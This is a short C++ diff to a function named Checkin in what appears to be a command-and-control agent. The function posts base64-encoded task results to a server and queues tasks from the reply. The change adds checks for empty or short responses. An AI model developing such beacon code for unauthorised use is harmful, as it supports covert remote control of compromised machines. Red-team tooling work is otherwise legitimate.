@@ -62,17 +62,21 @@ void HTTPCommunicationModule::Checkin(){
 	std::string data = "{\"results\":\"" + base64_encode(arrayTaskResult2json(results)) + "\"}";
 
 	std::cout << "Request Body: " << data << std::endl;
-	//Send POST request with Results
+
 	HttpResponse response = httpClient.Post(s2ws(Address), Port, L"/", data, headers);
 	std::cout << "Response Body: " << response.body << std::endl;
 
-	//Get a response with Tasks
+	// Minimum valid response: {"tasks":[]} = 12 chars.
+	// Skip silently on connection failure or unexpected response.
+	if (response.body.size() <= 10) return;
+
 	std::string tasks_string = response.body.substr(10);
+	if (tasks_string.empty()) return;
 	tasks_string.pop_back();
+
 	std::cout << "Tasks String: " << tasks_string << std::endl;
 	std::vector<Task> tasks = json2arrayTasks(tasks_string);
 
-	//Save Tasks to a list
 	for (int i = 0; i < tasks.size(); i++) {
 		agent.addTask(tasks[i]);
 	}
